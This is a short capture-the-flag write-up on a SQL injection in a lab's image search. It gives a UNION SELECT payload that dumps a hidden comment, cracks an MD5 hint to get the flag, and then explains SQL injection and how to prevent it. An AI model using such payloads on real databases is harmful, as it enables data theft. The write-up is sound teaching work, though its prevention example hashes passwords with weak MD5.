### Challenge

I had already found this flag by inspecting all the databases during the challenge on the members.

But if it was necessary to use a specific payload to obtain it from the image search, it would be this one:
```
1 UNION SELECT url,comment from Member_images.list_images
```

We see this comment :
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```
So we get `albatroz` from MD5 convert, we transform this password in SHA256 to get the flag :

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

### Vulnerability

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application.

![sql-injection](https://github.com/Sleleu/darkly/assets/93100775/0abeaeef-5d7f-4a52-a018-3dc202c02d78)

> source: https://portswigger.net/web-security/sql-injection

When successful, this attack can allow cybercriminals to:

- Access sensitive data such as passwords, credit cards details, or personal user information
- Perform admin tasks on the database
- Alter database information
- Recover files from the system

### How to prevent SQLi

- The use of prepared statements with variable binding
  Here is an example :
  ```
  $sql = "SELECT `id` FROM `user` WHERE `email`=:email AND `password`=:password";
  $data = [
    'email'    => $_POST['email'],
    'password' => md5($_POST['password'])
  ];
  $prep = $conn->prepare($sql);
  $result = $prep->execute( $data );
  ```
  > source: https://www.codeur.com/tuto/php/se-proteger-injections-sql/
- Create an allowlist input validation
- Escaping All User Supplied Input
- Minimize the privileges assigned to every database account 

### Ressources
- https://crashtest-security.com/sql-injection-union/
- https://portswigger.net/web-security/sql-injection
- https://mariadb.com/kb/en/information-schema-tables-table/
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
